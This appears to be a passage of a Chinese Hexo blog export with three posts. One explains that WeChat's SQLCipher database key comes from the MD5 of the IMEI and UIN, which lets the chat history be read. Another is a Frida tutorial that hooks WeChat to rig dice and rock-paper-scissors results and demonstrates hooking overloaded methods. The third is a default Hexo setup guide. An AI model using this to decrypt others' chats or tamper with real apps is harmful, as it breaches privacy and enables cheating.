title="读取微信数据库文件内容"></a>读取微信数据库文件内容</h3><p>将手机的IMEI和微信用户UIN值进行拼接后进行md5加密，取小写md5的前七位就是微信数据库的密码。<br>用Navicat读取数据库文件是提示错误：<br><img src="Navicat%E8%AF%BB%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E6%96%87%E4%BB%B6%E6%97%B6%E6%8F%90%E7%A4%BA%E9%94%99%E8%AF%AF.png" alt="Navicat读取数据库文件时提示错误"><br>这是因为微信数据库用的是SQLCipher开源库提供的加密解密算法，读取数据库文件需要使用SQLCipher这个软件。<br>打开后输入密码，即可看到聊天内容：<br><img src="%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95.png" alt="微信聊天记录"></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="http://blog.csdn.net/jiangwei0910410003/article/details/52238891" target="_blank" rel="noopener">http://blog.csdn.net/jiangwei0910410003/article/details/52238891</a> </p>]]></content>
      
      
      <categories>
          
          <category> Android技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 微信聊天记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android HOOK 技术之Frida的初级使用</title>
      <link href="/2017/04/01/Android-HOOK-%E6%8A%80%E6%9C%AF%E4%B9%8BFrida%E7%9A%84%E5%88%9D%E7%BA%A7%E4%BD%BF%E7%94%A8/"/>
      <url>/2017/04/01/Android-HOOK-%E6%8A%80%E6%9C%AF%E4%B9%8BFrida%E7%9A%84%E5%88%9D%E7%BA%A7%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p><strong>Frida</strong>是一款基于Python + JavaScript 的Hook与调试框架，在Android\Linux\Windows等平台均能使用。这里我们以<strong>Windows</strong>来对Android应用程序进行Hook。Frida的官网地址是：<a href="https://www.frida.re。" target="_blank" rel="noopener">https://www.frida.re。</a></p><a id="more"></a><h2 id="Windows下Frida的安装"><a href="#Windows下Frida的安装" class="headerlink" title="Windows下Frida的安装"></a>Windows下Frida的安装</h2><blockquote><p>有多种安装方法，这里提供两种，第一种直接使用pip安装，第二种是下载egg文件安装</p></blockquote><h3 id="1-通过pip安装Frida"><a href="#1-通过pip安装Frida" class="headerlink" title="1.通过pip安装Frida"></a>1.通过pip安装Frida</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install frida</span><br></pre></td></tr></table></figure><h3 id="2-去下载对应平台的egg安装包进行安装"><a href="#2-去下载对应平台的egg安装包进行安装" class="headerlink" title="2.去下载对应平台的egg安装包进行安装"></a>2.去下载对应平台的egg安装包进行安装</h3><p>下载地址：<a href="https://pypi.python.org/pypi/frida" target="_blank" rel="noopener">https://pypi.python.org/pypi/frida</a><br>当前最新版本为<strong>9.1.23</strong>，下载对应平台和Python版本的安装包，例如我的系统为Win64，Python为2.7，下载的文件为<strong>frida-9.1.23-py2.7-win-amd64.egg</strong>。下载后安装即可。</p><blockquote><p>由于网络原因，方法1安装时间太久，这里推荐第二种方法。</p></blockquote><p>安装完成后在Dos窗口输入命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-ps</span><br></pre></td></tr></table></figure><p>出现类似以下的界面表示安装成功。</p><p><img src="frida-ps.png" alt="frida-ps"></p><h2 id="Android下Frida环境的搭建"><a href="#Android下Frida环境的搭建" class="headerlink" title="Android下Frida环境的搭建"></a>Android下Frida环境的搭建</h2><blockquote><p>要求：一部Root过的手机或模拟器，最好采用4.4 ARM系统。PS：我真机采用的是魅族4的5.1系统，有些功能实现不了，只好用模拟器来完成。模拟器的具体配置如下图所示。</p></blockquote><p><img src="%E6%A8%A1%E6%8B%9F%E5%99%A8%E9%85%8D%E7%BD%AE.png" alt="模拟器配置"></p><p>首先需用下载最新的frida-server，下载地址为：<a href="http://build.frida.re/frida-snapshot/android/arm/bin/frida-server。" target="_blank" rel="noopener">http://build.frida.re/frida-snapshot/android/arm/bin/frida-server。</a><br>下载后将文件上传到手机中，并赋予执行权限。上传到手机使用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb push frida-server &#x2F;data&#x2F;local&#x2F;tmp&#x2F;</span><br></pre></td></tr></table></figure><p>![adb push](adb push.png)</p><p>将frida-server赋予执行权限，命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">adb shell</span><br><span class="line">su</span><br><span class="line">cd &#x2F;data&#x2F;local&#x2F;tmp&#x2F;</span><br><span class="line">chmod 777 frida-server</span><br></pre></td></tr></table></figure><p><img src="%E8%BF%90%E8%A1%8CFrida-Server.png" alt="运行Frida-Server"></p><p>运行Frida-Server</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;data&#x2F;local&#x2F;tmp&#x2F;frida-server</span><br></pre></td></tr></table></figure><p><img src="%E8%BF%90%E8%A1%8CFrida-Server%E7%BB%93%E6%9E%9C.png" alt="运行Frida-Server结果"></p><p>执行frida-ps -U可以看到手机上的进程</p><p><img src="%E6%89%8B%E6%9C%BA%E8%BF%9B%E7%A8%8B.png" alt="手机进程"></p><blockquote><p>使用frida-ps -R 也可以，但是需要进行转发。执行<code>adb forward tcp:27042 tcp:27042</code>后执行<code>frida-ps -R</code>也可以看到手机上的进程</p></blockquote><p>至此，准备工作已经做好，现在来进行对Android上的程序进行Hook了。<br>首先以WX的掷骰子和猜拳头为例。这里采用最新版的WX（<strong>6.5.7</strong>）。<br>其代码如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*</span></span><br><span class="line"><span class="keyword">import</span> frida, sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span><span class="params">(message, data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">'type'</span>] == <span class="string">'send'</span>:</span><br><span class="line">        print(<span class="string">"[*] &#123;0&#125;"</span>.format(message[<span class="string">'payload'</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(message)</span><br><span class="line"></span><br><span class="line">jscode = <span class="string">"""</span></span><br><span class="line"><span class="string">Java.perform(function () &#123;</span></span><br><span class="line"><span class="string">var be= Java.use("com.tencent.mm.sdk.platformtools.bf");</span></span><br><span class="line"><span class="string">send("start")</span></span><br><span class="line"><span class="string">be.da.implementation = function()&#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    var type = arguments[0];</span></span><br><span class="line"><span class="string">    send(type);//5表示掷骰子，2表示猜拳头</span></span><br><span class="line"><span class="string">    if(type ==2)&#123;</span></span><br><span class="line"><span class="string">    return 1;//表示是石头</span></span><br><span class="line"><span class="string">    &#125;else&#123;</span></span><br><span class="line"><span class="string">        return 5;//骰子6点</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">send("end")</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">process = frida.get_usb_device().attach(<span class="string">'com.tencent.mm'</span>)</span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">'message'</span>, on_message)</span><br><span class="line">print(<span class="string">'[*] weixin Start...'</span>)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><p>手机上打开微信后，运行代码。<br>然后点击掷骰子，可以看到都是6点，猜拳头全部是石头。<br><img src="%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C.png" alt="运行结果"></p><p>下面来用一个例子来介绍一下，如何来通过Hook的方法修改原来的内容，以及当出现相同方法名时，如何对该方法进行Hook。<br>其Android的Activity代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test.fridatest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.View.OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> Button myButton1;</span><br><span class="line"><span class="keyword">private</span> String TAG = <span class="string">"fuping"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        myButton1 = (Button) findViewById(R.id.button1);</span><br><span class="line">        myButton1.setOnClickListener( <span class="keyword">new</span> ButtonClick());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ButtonClick</span> <span class="keyword">implements</span> <span class="title">OnClickListener</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">switch</span> (v.getId()) &#123;</span><br><span class="line">            <span class="keyword">case</span> R.id.button1:</span><br><span class="line">                <span class="keyword">int</span> nRet = test(<span class="number">4</span>);</span><br><span class="line">                String strRet = nRet + <span class="string">""</span>;</span><br><span class="line">                Toast.makeText(MainActivity.<span class="keyword">this</span>, strRet,Toast.LENGTH_LONG).show();</span><br><span class="line">                Log.i(TAG, <span class="string">"test(int):"</span>+ strRet);</span><br><span class="line">                strRet = test(<span class="number">4</span>,<span class="number">2</span>)+<span class="string">""</span>;</span><br><span class="line">                Log.i(TAG, <span class="string">"test(int,int):"</span>+ strRet);</span><br><span class="line">                strRet = test(<span class="number">4</span>,<span class="string">"2"</span>)+<span class="string">""</span>;</span><br><span class="line">                Log.i(TAG, <span class="string">"test(int,String):"</span>+ strRet);</span><br><span class="line">                strRet = change(<span class="number">4</span>,<span class="string">"2"</span>)+<span class="string">""</span>;</span><br><span class="line">                Log.i(TAG, <span class="string">"change(int,String):"</span>+ strRet);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> num)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> nRet = num*<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">return</span> nRet;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> num,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> nRet = num*<span class="number">2</span> + b ;</span><br><span class="line">        <span class="keyword">return</span> nRet;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">test</span><span class="params">(<span class="keyword">int</span> num,String b)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    String nRet = num*<span class="number">2</span> + b ;</span><br><span class="line">        <span class="keyword">return</span> nRet;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">change</span><span class="params">(<span class="keyword">int</span> num,String b)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    String nRet = num*<span class="number">2</span> + b ;</span><br><span class="line">        <span class="keyword">return</span> nRet;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先演示一下对change方法的hook。<br>hook之前change方法输出的结果为82，预期Hook之后输出的结果应该为164。<br>在真机上运行结果如下所示：</p><p><img src="%E5%AF%B9change%E8%BF%9B%E8%A1%8Chook.png" alt="对change进行hook"></p><p>发现Hook之后返回的是null，而且报错。（经过多次给手机系统升级或降级，都无法成功，最后之后在模拟器上测试了）</p><p><img src="%E6%A8%A1%E6%8B%9F%E5%99%A8%E4%B8%8A%E5%AF%B9change%E6%96%B9%E6%B3%95%E8%BF%9B%E8%A1%8Chook.png" alt="模拟器上对change方法进行hook"></p><p>在模拟器上进行Hook后，出现了预期的结果。<br>在对test方法进行hook时，由于有多个test方法，所以在进行Hook时，需要指定是哪个方法。<br>例如对<code>String test(int num,String b)</code>进行hook时，可以使用如下代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> TM = Java.use(<span class="string">"com.test.fridatest.MainActivity"</span>);</span><br><span class="line">TM.test.overload(<span class="string">"int"</span>,<span class="string">"java.lang.String"</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a,b</span>) </span>&#123;</span><br><span class="line">    send(<span class="string">"Called - test(int,String):"</span>+a+<span class="string">"----"</span>+b);</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">this</span>.test.overload(<span class="string">"int"</span>,<span class="string">"java.lang.String"</span>).call(<span class="keyword">this</span>,<span class="number">8</span>,<span class="string">"3"</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>附上对test和change同时hook 的结果：</p><p><img src="%E5%AF%B9test%E5%92%8Cchange%E7%9A%84hook.png" alt="对test和change的hook"></p><p>就个人而言，针对Frida和Xposed相比，Frida操作更简单，而且不需要重启手机。但相关资料较少，还是需要慢慢学习。</p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ol><li><a href="https://www.frida.re/docs/examples/android/" target="_blank" rel="noopener">https://www.frida.re/docs/examples/android/</a></li><li><a href="https://www.codemetrix.net/hacking-android-apps-with-frida-1/" target="_blank" rel="noopener">https://www.codemetrix.net/hacking-android-apps-with-frida-1/</a></li><li><a href="http://www.cnblogs.com/konf/p/5998785.html" target="_blank" rel="noopener">http://www.cnblogs.com/konf/p/5998785.html</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Android技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安卓Hook </tag>
            
            <tag> Frida </tag>
            
            <tag> 摇骰子 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2017/03/20/hello-world/"/>
      <url>/2017/03/20/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><a id="more"></a><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-blog"><a href="#Create-a-new-blog" class="headerlink" title="Create a new blog"></a>Create a new blog</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo init</span><br></pre></td></tr></table></figure><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p><h3 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h3><p>运行<code>hexo server</code>，浏览器输入<a href="http://localhost:4000" target="_blank" rel="noopener">http://localhost:4000</a> 无法访问</p><p>产生原因可能是<strong>端口占用</strong>。</p><p>Windows下运行命令<code>netstat -ano | findstr 4000</code>，看是否有有进程占用了4000端口。</p><p><img src="%E7%AB%AF%E5%8F%A3%E5%8D%A0%E7%94%A8.png" alt="端口占用"><br>这是安装了福昕PDF阅读器的原因，将<code>Foxitprotect.exe</code>进程结束即可。</p><h3 id="安装主题"><a href="#安装主题" class="headerlink" title="安装主题"></a>安装主题</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/litten/hexo-theme-yilia.git themes/yilia</span><br></pre></td></tr></table></figure><p><img src="%E8%8E%B7%E5%8F%96%E4%B8%BB%E9%A2%98.png" alt="获取主题"></p><p>修改hexo根目录下的 _config.yml ： <code>theme: yilia</code></p><p>之后运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure><h3 id="修改头像"><a href="#修改头像" class="headerlink" title="修改头像"></a>修改头像</h3><p>hexo根目录下source文件夹中新建assets\img文件夹，将头像文件复制进去<br>修改<strong>主题目录</strong>中的_config.yml ：<code>avatar: /assets/img/avatar.jpg</code></p><p><img src="%E4%BF%AE%E6%94%B9%E5%A4%B4%E5%83%8F.png" alt="修改头像"></p><h3 id="添加标签"><a href="#添加标签" class="headerlink" title="添加标签"></a>添加标签</h3><h5 id="1-添加标签"><a href="#1-添加标签" class="headerlink" title="1.添加标签"></a>1.添加标签</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tag: 标签</span><br></pre></td></tr></table></figure><h5 id="2-添加多个标签"><a href="#2-添加多个标签" class="headerlink" title="2.添加多个标签"></a>2.添加多个标签</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tags: [标签1,标签2,标签3]</span><br></pre></td></tr></table></figure><p>或者：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tags:</span><br><span class="line">     - 标签1</span><br><span class="line">     - 标签2</span><br></pre></td></tr></table></figure><h3 id="文章部分显示"><a href="#文章部分显示" class="headerlink" title="文章部分显示"></a>文章部分显示</h3><p>使用<code>&lt;!-- more --&gt;</code>标签来隐藏其下面的内容~</p>]]></content>
      
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> 主题 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
